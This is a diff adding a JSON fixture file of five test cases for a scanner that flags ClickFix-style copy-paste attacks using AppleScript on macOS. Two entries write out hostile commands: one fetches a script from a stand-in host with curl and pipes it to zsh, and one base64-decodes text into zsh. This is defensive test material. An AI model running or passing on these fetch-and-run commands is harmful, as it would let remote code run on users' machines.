@@ -1,0 +1,155 @@
+[
+  {
+    "fixture_id": "CF-AS-001",
+    "name": "osascript shell execution",
+    "category": "applescript",
+    "description": "osascript shell execution supplied only as inert scanner data.",
+    "command_text": "osascript -e 'do shell script \"curl -fsSL https://example.invalid/fix | zsh\"' ",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "applescript_shell_execution"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-AS-002",
+    "name": "AppleScript encoded shell text",
+    "category": "applescript",
+    "description": "AppleScript encoded shell text supplied only as inert scanner data.",
+    "command_text": "osascript -e 'do shell script \"printf cHJpbnRmICdNU0FBX0NMSUNLRklYX1RFU1Rcbic= | base64 -D | zsh\"' ",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "applescript_shell_execution",
+      "decoded_content_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-AS-003",
+    "name": "AppleScript URL scheme",
+    "category": "applescript",
+    "description": "AppleScript URL scheme supplied only as inert scanner data.",
+    "command_text": "applescript://SAFE_TEST_PLACEHOLDER",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "applescript_url_scheme"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-AS-004",
+    "name": "Script Editor execution observation",
+    "category": "applescript",
+    "description": "Script Editor execution observation supplied only as inert scanner data.",
+    "command_text": "<SIMULATED_SCRIPT_EDITOR_TO_SHELL>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "script_editor_to_shell",
+      "clickfix_terminal_bypass"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed.",
+    "simulation": true,
+    "simulated_decision": "block",
+    "simulated_rule_ids": [
+      "script_editor_to_shell",
+      "clickfix_terminal_bypass"
+    ]
+  },
+  {
+    "fixture_id": "CF-AS-005",
+    "name": "open AppleScript URL",
+    "category": "applescript",
+    "description": "open AppleScript URL supplied only as inert scanner data.",
+    "command_text": "open 'applescript://SAFE_TEST_PLACEHOLDER'",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "applescript_url_scheme"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  }
+]
